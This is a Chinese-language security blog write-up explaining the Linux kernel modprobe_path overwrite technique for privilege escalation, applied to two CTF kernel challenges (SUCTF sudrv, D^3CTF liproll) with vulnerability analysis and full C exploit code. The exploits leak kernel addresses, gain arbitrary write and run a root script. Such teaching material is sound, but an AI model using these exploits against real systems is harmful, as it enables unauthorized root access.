> 原文链接: https://www.anquanke.com//post/id/236126 


# Kernel提权方法之modprobe_path覆写


                                阅读量   
                                **130193**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01aedf123883b21bbe.jpg)](https://p4.ssl.qhimg.com/t01aedf123883b21bbe.jpg)



## modprobe_path介绍

`modprobe_path`是用于在`Linux`内核中添加可加载的内核模块，当我们在`Linux`内核中安装或卸载新模块时，就会执行这个程序。他的路径是一个内核全局变量，默认为 `/sbin/modprobe`，可以通过如下命令来查看该值：

```
cat /proc/sys/kernel/modprobe
-&gt; /sbin/modprobe
```

此外，`modprobe_path`存储在内核本身的`modprobe_path`符号中，且具有可写权限。也即普通权限即可修改该值。

而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个 `modprobe_path`所指向的程序。如果我们将这个字符串指向我们自己的`sh`文件 ，并使用 `system`或 `execve` 去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以执行我们自己的二进制文件了。其调用流程如下：

```
（1）do_execve()
（2）do_execveat_common()
（3）bprm_execve()
（4）exec_binprm()
（5）search_binary_handler()
（6）request_module()
（7）call_usermodehelper()
```

那么查看 `__request_module` 源码如下，本质就是调用了 `call_usermodehelper`函数：

```
int __request_module(bool wait, const char *fmt, ...) 
`{` 
    va_list args; 
    char module_name[MODULE_NAME_LEN]; 
    unsigned int max_modprobes; 
    int ret; 
// char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe"; 
    char *argv[] = `{` modprobe_path, "-q", "--", module_name, NULL `}`; 
    static char *envp[] = `{` "HOME=/", 
                "TERM=linux", 
                "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 
                NULL `}`; // 环境变量. 
    static atomic_t kmod_concurrent = ATOMIC_INIT(0); 
#define MAX_KMOD_CONCURRENT 50    /* Completely arbitrary value - KAO */ 
    static int kmod_loop_msg; 

    va_start(args, fmt); 
    ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);   
    va_end(args); 
    if (ret &gt;= MODULE_NAME_LEN) 
        return -ENAMETOOLONG; 
    max_modprobes = min(max_threads/2, MAX_KMOD_CONCURRENT);    
    atomic_inc(&amp;kmod_concurrent); 
    if (atomic_read(&amp;kmod_concurrent) &gt; max_modprobes) `{` 
        /* We may be blaming an innocent here, but unlikely */ 
        if (kmod_loop_msg++ &lt; 5) 
            printk(KERN_ERR 
                   "request_module: runaway loop modprobe %s\n", 
                   module_name); 
        atomic_dec(&amp;kmod_concurrent);                           
        return -ENOMEM;                                         
    `}` 
    ret = call_usermodehelper(modprobe_path, argv, envp,        // 执行用户空间的应用程序
            wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC); 
    atomic_dec(&amp;kmod_concurrent);                                
    return ret; 
`}`
```

接着查看 `call_usermodehelper`函数源码，该函数用于在内核空间中执行用户空间的程序，并且该程序具有`root`权限。这也保证了我们自己所写的 `sh`文件在被执行时，能执行具有`root`权限的功能，实现提权。

```
call_usermodehelper(char *path, char **argv, char **envp, enum umh_wait wait);
enum umh_wait `{`
    UMH_NO_WAIT = -1,       /* don't wait at all */
    UMH_WAIT_EXEC = 0,      /* wait for the exec, but not the process */
    UMH_WAIT_PROC = 1,      /* wait for the process to complete */
 `}`;
```

代码如下所示：

```
system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' &gt; /tmp/getflag.sh");
system("chmod +x /tmp/getflag.sh");
system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /tmp/fl");
system("chmod +x /tmp/fl");

//changed modprobe_path
system("/tmp/fl")
```
1. 首先创建了一个我们自己的 sh文件 geflag.sh，用于 将 /flag拷贝到 /tmp/flag下，并赋予 /tmp/flag为可读可写可执行权限。然后赋予 /tmp/getflag.sh可执行权限。
1. 随后创建了一个错误格式头的文件 /tmp/fl，并赋予其可执行权限
1. 当我们覆写了 modprobe_path为 /tmp/getflag.sh后，调用 system(“/tmp/fl”)触发错误，随后就能以root权限执行 /tmp/getflag.sh，完成将原本只能 root可读的flag拷贝到 /tmp目录下，并赋予可读权限
此外，我们该如何确定 `modprobe_path`符号的存储地址呢？在内核题目中，通常使用 `cat /proc/kallsyms`来获取符号地址，但是 `modprobe_path`并不在其中。这里我们可以考虑查找引用了`modprobe_path`符号的地址，来获取其地址。而在上面 `__request_module`代码中，即引用了 `modprobe_path`的地址。所以我们可以通过以下方法找到 `modprobe_path`地址：
- 先通过 /proc/kallsyms找到 __request_module地址
- 随后查看 __reques_module函数汇编，找到 modprobe_path的引用
```
/ # cat /proc/kallsyms | grep __request     
ffffffffbb2aad00 T __request_module         
ffffffffbb1afdb8 t __request_module.cold    
ffffffffba886e60 T __request_percpu_irq     
ffffffffbb2baa30 T __request_region         
ffffffffbaee47fc t __request_region.cold    
ffffffffba8aa2b0 t __request_resource       

pwndbg&gt; x/28i 0xffffffffbb2aad00
   0xffffffffbb2aad00:  push   rbp
   0xffffffffbb2aad01:  mov    rbp,rsp
   0xffffffffbb2aad04:  push   r14
   0xffffffffbb2aad06:  push   r13
   0xffffffffbb2aad08:  push   r12
   0xffffffffbb2aad0a:  mov    r12,rsi
   0xffffffffbb2aad0d:  push   r10
   0xffffffffbb2aad0f:  lea    r10,[rbp+0x10]
   0xffffffffbb2aad13:  push   rbx
   0xffffffffbb2aad14:  mov    r13,r10
   0xffffffffbb2aad17:  mov    ebx,edi
   0xffffffffbb2aad19:  sub    rsp,0xb0
   0xffffffffbb2aad20:  mov    QWORD PTR [rbp-0x48],rdx
   0xffffffffbb2aad24:  mov    QWORD PTR [rbp-0x40],rcx
   0xffffffffbb2aad28:  mov    QWORD PTR [rbp-0x38],r8
   0xffffffffbb2aad2c:  mov    QWORD PTR [rbp-0x30],r9
   0xffffffffbb2aad30:  mov    rax,QWORD PTR gs:0x28
   0xffffffffbb2aad39:  mov    QWORD PTR [rbp-0x60],rax
   0xffffffffbb2aad3d:  xor    eax,eax
   0xffffffffbb2aad3f:  test   dil,dil
   0xffffffffbb2aad42:  jne    0xffffffffbb2aaec8
   0xffffffffbb2aad48:  cmp    BYTE PTR [rip+0x59d711],0x0        # 0xffffffffbb848460
   0xffffffffbb2aad4f:  je     0xffffffffbb2ab024
   0xffffffffbb2aad55:  lea    rax,[rbp-0x58]
   0xffffffffbb2aad59:  lea    rcx,[rbp-0xb0]
   0xffffffffbb2aad60:  mov    rdx,r12
   0xffffffffbb2aad63:  mov    esi,0x38
   0xffffffffbb2aad68:  lea    rdi,[rbp-0x98]

pwndbg&gt; x/s 0xffffffffbb848460
0xffffffffbb848460:     "/sbin/modprobe"

```

那么，总结一下该 技术的使用条件：
- 知道 modprobe_path地址
- 拥有一个任意地址写漏洞，用于修改 modprobe_path内容


## 2019 SUCTF Sudrv

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

```
__int64 __fastcall sudrv_ioctl(__int64 a1, int a2, __int64 size)
`{`
  __int64 result; // rax

  switch ( a2 )
  `{`
    case 0x73311337:
      if ( (unsigned __int64)(size - 1) &gt; 0xFFE )
        return 0LL;
      su_buf = (char *)_kmalloc(size, 0x480020LL);
      result = 0LL;
      break;
    case (int)0xDEADBEEF:
      if ( su_buf )
        JUMPOUT(0xB8LL);
      result = 0LL;
      break;
    case 0x13377331:
      kfree(su_buf);
      result = 0LL;
      su_buf = 0LL;
      break;
    default:
      return 0LL;
  `}`
  return result;
`}`

void __fastcall sudrv_ioctl_cold_2(__int64 a1)
`{`
  printk(a1);
  JUMPOUT(0x38LL);
`}`
```

程序总体有三个功能，一个是分配堆块，大小由用户输入；一个是释放堆块；一个是输出函数。其中在输出函数中，存在格式化字符串漏洞，使得我们可以泄露数据：

```
void __fastcall sudrv_ioctl_cold_2(__int64 a1)
`{`
  printk(a1);
  JUMPOUT(0x38LL);
`}`
```

还实现了一个 write函数，可以输入用户的数据到堆块中，这里没有对size进行检查，导致可以堆溢出。

```
__int64 sudrv_write()
`{`
  __int64 result; // rax

  if ( (unsigned int)copy_user_generic_unrolled(su_buf) )
    result = -1LL;
  else
    result = sudrv_write_cold_1();
  return result;
`}`
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

这道题的预期解是通过堆溢出，修改`slab`堆块的`next`指针，来将`slab`堆块分配到栈上，然后执行`ROP`。

但这道题，如果运用覆写 `modprobe_path`将会更加简单。首先这道题可以通过格式化字符串漏洞输出内核地址，从而得到`modprobe_path`的地址，其次这道题可以通过分配伪造堆块来实现任意地址写。完全符合覆写 `modprobe_path`的要求。

****泄露地址****

首先通过一个格式化字符串漏洞，输出栈上保留的内核地址，经过调试发现栈上第一个地址即是符合要求的内核地址，其与`modprobe_path`相差 `0x107a0a1`。此时栈上数据如下所示，`rsp`所指向的值就是一个内核地址。

```
rsp  0xffffb9fdc07dbe80 —▸ 0xffffffff9d5c827f ◂— mov    ebx, eax /* 0xffffffdfd3dc389 */
     0xffffb9fdc07dbe88 ◂— add    byte ptr [rax + 0x13], dl /* 0xae2df5d5a3135000 */
     0xffffb9fdc07dbe90 ◂— 0
     0xffffb9fdc07dbe98 —▸ 0xffffffff9e69a268 ◂— 0
     0xffffb9fdc07dbea0 —▸ 0xffffb9fdc07dbed8 —▸ 0xffff998c47a86700 ◂— 0
     0xffffb9fdc07dbea8 ◂— out    dx, eax /* 0xdeadbeef */
     0xffffb9fdc07dbeb0 —▸ 0xffff998c47a86700 ◂— 0
     0xffffb9fdc07dbeb8 ◂— 0
```

****任意地址写****

然后就利用堆溢出漏洞修改空闲堆块的`next`指针为 `modprobe_path`地址，来实现分配伪造堆块到 `modprobe_path`处。关于内核堆的知识，这里不做展开讲述，可以参考[这篇文章](https://blog.csdn.net/lukuen/article/details/6935068)。简单来说`Linux`内核对小内存分配使用的是 `slab/slub`分配器，其与glibc下的`ptmalloc`的`fastbin`有许多类似的地方，比如`Kfree`后，空闲堆块也会有 `fd`指针指向下一个空闲块。而且`slab`分配的空闲堆块从一开始地址都是连续的，他们共同组成一个内存页面。类似如下，第一个 `0x400` 空闲堆块其堆头的`next`指向`0xffff400`地址，也就是紧邻的下一个`0x400`空闲堆块，而 `0xffff400`的`next`指针指向了 `0xffff800`的空闲堆块。

```
0xffff000        | next-&gt; 0x400 |      0x0        |
...
0xffff400        | next-&gt; 0x800 |     0x0        |
...
0xffff800        | next-&gt;0xc00  |    0x0        |
...
```

所以，通过堆溢出，修改紧邻的下一个空闲堆块的`next`指针指向 `modprobe_path`，然后再分配两次堆块，即可将伪造堆块分配到 `modprobe_path`地址处。

最后，将`modprobe_path`按照上述覆写为 `/tmp/getflag.sh`即可。

```
pwndbg&gt; x/s 0xffffffff9f242320
0xffffffff9f242320:     "/tmp/getflag.sh"
```

`EXP`如下：

```
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/prctl.h&gt;

int fd;
size_t offset = 0x0;

void cmalloc(int size)`{`
    if(-1 == ioctl(fd, 0x73311337, size))`{`
        printf('malloc error\n');
    `}`
`}`

void cfree()`{`
    if(-1 == ioctl(fd, 0x13377331, NULL))`{`
        printf('free error\n');
    `}`
`}`

void cprintf()`{`
    if(-1 == ioctl(fd, 0xDEADBEEF, NULL))`{`
        printf('print error\n');
    `}`
`}`

void main()`{`
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' &gt; /tmp/getflag.sh");
    system("chmod +x /tmp/getflag.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /tmp/ll");
    system("chmod +x /tmp/ll");

    fd = open("/dev/meizijiutql", O_RDWR);
    char buf[0x1000] = `{` 0 `}`;

    char mod[0x20] = `{` 0 `}`;
    cmalloc(168);
    char buff[150] = "%llx-%llx-%llx-%llx-%llx-kernel:%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx";

    write(fd, buff, 150);

    printf("=========&gt;begin leak addr\n");
    cprintf();
    cprintf();
    printf("===== please input modprobe_path(kernel_addr+0x107a0a1) addr:\n");
    scanf("%lx",mod);
    printf("modprobe_path:0x%lx\n",mod);

    printf("kmalloc first\n");
    cmalloc(0x80);
    write(fd, buf, 0x60);
    cprintf();
    cprintf();

    cmalloc(0x400);
    cmalloc(0x400);

    memset(buf, 'a', 0x400);
    strncat(buf, mod, 0x8);
    printf("modprobe_path: %lx\n",buf[0x400]);
    cmalloc(0x400);
    printf("chunk overflow\n");
    write(fd, buf, 0x408);
    cmalloc(0x400);

    write(fd, "/tmp/getflag.sh", 0x20);
    cmalloc(0x400);
    printf("change modprobe_path\n");
    write(fd, "/tmp/getflag.sh", 0x20);

    close(fd);
    system("/tmp/ll");
    system("cat /tmp/flag");
`}`
```



## 2020-D^3CTF liproll

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

```
__int64 __fastcall liproll_unlocked_ioctl(__int64 a1, unsigned int a2, unsigned int *a3)
`{`
  __int64 result; // rax

  if ( a2 == 0xD3C7F03 )
  `{`
    create_a_spell();
    result = 0LL;
  `}`
  else if ( a2 &gt; 0xD3C7F03 )
  `{`
    if ( a2 != 0xD3C7F04 )
      return 0LL;
    choose_a_spell(a3);
    result = 0LL;
  `}`
  else
  `{`
    if ( a2 != 0xD3C7F01 )
    `{`
      if ( a2 == 0xD3C7F02 )
      `{`
        global_buffer = 0LL;
        *(&amp;global_buffer + 1) = 0LL;
      `}`
      return 0LL;
    `}`
    cast_a_spell(a3);
    result = 0LL;
  `}`
  return result;
`}`
```

主要实现了四种功能，`create_spell`是创建一个 `spell`结构体并为其分配内存，将其保存在`list`中 ；`choose_a_spell`是从 list中选择 一个`spell`结构体；`cast_spell`主要功能是将用户传入的字符串拷贝到`global_buffer`中：

```
unsigned __int64 __fastcall cast_a_spell(__int64 *a1)
`{`
  unsigned int size; // eax
  int v2; // edx
  __int64 src; // rsi
  _BYTE dst[256]; // [rsp+0h] [rbp-120h] BYREF
  void *global_buf1; // [rsp+100h] [rbp-20h]
  int v7; // [rsp+108h] [rbp-18h]
  unsigned __int64 v8; // [rsp+110h] [rbp-10h]

  v8 = __readgsqword(0x28u);
  if ( !global_buffer )
    return cast_a_spell_cold();
  global_buf1 = global_buffer;
  size = *((_DWORD *)a1 + 2);
  v2 = 256;
  src = *a1;
  if ( size &lt;= 0x100 )
    v2 = *((_DWORD *)a1 + 2);
  v7 = v2;
  if ( !copy_from_user(dst, src, size) )
  `{`
    memcpy(global_buffer, dst, *((unsigned int *)a1 + 2));
    global_buffer = global_buf1;
    *((_DWORD *)&amp;global_buffer + 2) = v7;
  `}`
  return __readgsqword(0x28u) ^ v8;
`}`
```

而我们注意将用户输入字符串`src`是先拷贝到栈上 `dst`处，其大小为 `0x100`，而程序对输入的 `src`大小没有做限制。也即是这里存在缓冲区溢出漏洞，可以通过溢出 `dst`修改后续的`global_buf1`和`v7`，而这两个变量后面可以修改全局变量 `global_buffer`和 `size`。

而通过该漏洞修改了 `global_buffer`和 `size`漏洞后，便可以再结合 `cast_a_spell` 实现任意地址写。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"></a>利用分析

这道题开启了 `FG-KASLR`会导致`vmlinux` 和相应的内核模块以函数为单位分段，然后在原先地址随机化的基础上打乱函数加载顺序。也即增大了使用 `ROP`技术的难度。但是这道题如果通过覆写 `modprobe_path`，则会使难度大大减小。

为了达到覆写 `modprobe_path`的要求，首先一个任意地址写漏洞已经存在，其次就是要泄露地址。

****泄露地址****

在`choose_a_spell`可以指定一个`spell`结构体，而这里存在索引上溢。当我们指向16时，`list`数组将会取出紧邻的`vmlinux_base`地址，然后我们将该地址的数据打印出来，如下所示。而在`0x69`偏移处可以找到一个关于 `vmlinux`的地址，根据这个地址可以得到 `vmlinux_base`地址。 那么我们即可使用`read`函数将其读取出来，泄露了`kernel`地址，加上其与`modprobe_path`的偏移，即可得到`modprobe_path`的地址，该地址是不受 `FG-KASLR`影响的。

```
pwndbg&gt; x/28i 0xffffffff9d800000
   0xffffffff9d800000:  lea    rsp,[rip+0x1403f51]        # 0xffffffff9ec03f58
   0xffffffff9d800007:  call   0xffffffff9d8000f0
   0xffffffff9d80000c:  lea    rdi,[rip+0xffffffffffffffed]        # 0xffffffff9d800000
   0xffffffff9d800013:  push   rsi
   0xffffffff9d800014:  call   0xffffffff9d800200
   0xffffffff9d800019:  pop    rsi
   0xffffffff9d80001a:  add    rax,0x1f256000
   0xffffffff9d800020:  jmp    0xffffffff9d800042
   0xffffffff9d800022:  data16 nop WORD PTR cs:[rax+rax*1+0x0]
   0xffffffff9d80002d:  nop    DWORD PTR [rax]
   0xffffffff9d800030:  call   0xffffffff9d8000f0
   0xffffffff9d800035:  push   rsi
   0xffffffff9d800036:  call   0xffffffff9e528460
   0xffffffff9d80003b:  pop    rsi
   0xffffffff9d80003c:  add    rax,0x1ec0a000
   0xffffffff9d800042:  mov    ecx,0xa0
   0xffffffff9d800047:  test   DWORD PTR [rip+0x12d0807],0x1        # 0xffffffff9ead0858
   0xffffffff9d800051:  je     0xffffffff9d800059
   0xffffffff9d800053:  or     ecx,0x1000
   0xffffffff9d800059:  mov    cr4,rcx
   0xffffffff9d80005c:  add    rax,QWORD PTR [rip+0x1411fad]        # 0xffffffff9ec12010
   0xffffffff9d800063:  mov    cr3,rax
   0xffffffff9d800066:  mov    rax,0xffffffff9d80006f                //此处存在vmlinux地址
```

****覆写modprobe_path****

得到`modprobe_path`地址后。我们按照上述的缓冲区溢出漏洞构造任意地址写。构造数据如下：

```
memset(buffer, 0x0, 0x100);
    (unsigned long long)buffer[0x100] = modprobe_path;
    printf("buffer_addr: 0x%llx\n", buffer[0x100]);
```

那么即可将 `global_buffer`的地址修改为 `modprobe_path`的地址。然后我们再次执行 `cast_a_spell`向 `modprobe_path`地址处写入我们自己伪造的`shell`文件。即可实现获得`flag`。

`EXP`如下：

```
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/prctl.h&gt;

typedef struct Spell_struct`{`
    char* buf;
    unsigned int * size; 
`}`Spell;

void create(int fd)`{`
    if(0 &lt; ioctl(fd, 0xD3C7F03))`{`
        printf(' create error\n');
    `}`
`}`

void choose(int fd, unsigned int arg3)`{`
    if(0 &lt; ioctl(fd, 0xD3C7F04, &amp;arg3))`{`
        printf(' choose error\n');
    `}`
`}`

void cast(int fd, Spell arg3)`{`
    if(0 &lt; ioctl(fd, 0xD3C7F01, &amp;arg3))`{`
        printf('cast error\n');
    `}`
`}`

void init(int fd, unsigned int arg3)`{`
     if(0 &lt; ioctl(fd, 0xD3C7F02, &amp;arg3))`{`
        printf('cast error\n');
    `}`
`}`

void main()`{`
    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag /tmp/flag\n/bin/chmod 777 /tmp/flag' &gt; /tmp/getflag.sh");
    system("chmod +x /tmp/getflag.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /tmp/fl");
    system("chmod +x /tmp/fl");

    int fd = 0;
    fd = open("/dev/liproll",O_RDWR);

    create(fd);
    create(fd);
    char buffer[0x200] = `{` 0 `}`;
    choose(fd, 0);

    choose(fd, 16);
    read(fd, buffer, 0x100);
    for(int i=0; i&lt;60; i++)`{`
         printf("buffer_value: %d 0x%x\n", i, (int)buffer[i]);
    `}`

    unsigned int vmlinx_addr = *(unsigned int*)(buffer+0x69);
    printf("vmlibux_addr: 0x%lx", vmlinux_addr);
    unsigned long long vmlinux_base = 0xffffffff00000000 + (vmlinux_addr &amp; 0xffff0000);
    unsigned long long modprobe_path  = 0x1448460 + vmlinux_base;
    printf("vmlinux_base : 0x%llx\n",vmlinux_base);
    printf("modprobe_path : 0x%llx\n",modprobe_path);

    memset(buffer, 0x0, 0x100);
    *(unsigned long long *)(buffer+0x100) = modprobe_path;
    printf("buffer_addr: 0x%llx\n %p\n", (size_t)buffer[0x100], &amp;buffer);

    Spell spell_user;
    spell_user.buf =  buffer;
    spell_user.size = 0x108;

    choose(fd, 0);
    cast(fd, spell_user);
    char modname[0x20] =`{` 0 `}`;
    strncpy(modname, "/tmp/getflag.sh", 0x20);
    spell_user.buf = modname;
    cast(fd, spell_user);
    getchar();
    system("/tmp/fl");
    system("cat /tmp/flag");

    return;
`}`
```



## 总结

覆写`modprobe_path`来在`Kernel`中完成提权，其使用条件比较简单，有时候能帮助我们降低解体难度，是一种十分可靠和简洁的思路。当然还有类似的思路，也是值得我们后续深入学习。



## 参考

[Linux Kernel Exploitation Technique: Overwriting modprobe_path](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/)

[Linux Kernel Exploit 内核漏洞学习(4)-RW Any Memory](https://xz.aliyun.com/t/6067)
